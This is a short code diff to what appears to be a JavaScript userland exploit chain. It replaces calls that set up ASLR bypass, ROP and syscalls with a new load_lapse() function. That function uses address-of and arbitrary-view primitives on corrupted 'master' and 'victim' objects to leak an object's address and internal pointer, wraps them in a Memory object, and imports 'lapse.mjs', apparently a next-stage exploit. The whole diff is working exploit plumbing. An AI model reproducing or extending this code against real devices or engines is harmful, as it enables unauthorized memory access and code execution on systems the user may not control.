@@ -1508,17 +1508,26 @@ function init_structs() {
 }
 //#endregion
 
+async function load_lapse() {
+  const { Memory } = await import('./module/mem.mjs');
+  const { Int: Int64 } = await import('./module/int64.mjs');
+  const obj = { addr: null, 0: 0 };
+  const rawPtr = arw.addrof(obj);
+  const btRaw = arw.view(rawPtr + 8n).getBigUint64(0, true);
+  const obj_p  = new Int64(Number(rawPtr & 0xffffffffn), Number(rawPtr >> 32n));
+  const obj_bt = new Int64(Number(btRaw  & 0xffffffffn), Number(btRaw  >> 32n));
+  const off0x10 = new Int64(0x10, 0);
+  new Memory(arw.master, arw.victim, obj, obj_p.add(off0x10), obj_bt);
+  await import('./lapse.mjs');
+}
 export async function main() {
   try {
     logger.info("===USERLAND===");
 
     init_structs();
     await init_arw();
-    init_aslr();
-    init_rop();
-    init_syscalls();
-
-    logger.info("===END===");
+    logger.info("===LOADING LAPSE===");
+    await load_lapse();
   } catch (e) {
     logger.error(e.message);
     logger.error(e.stack);
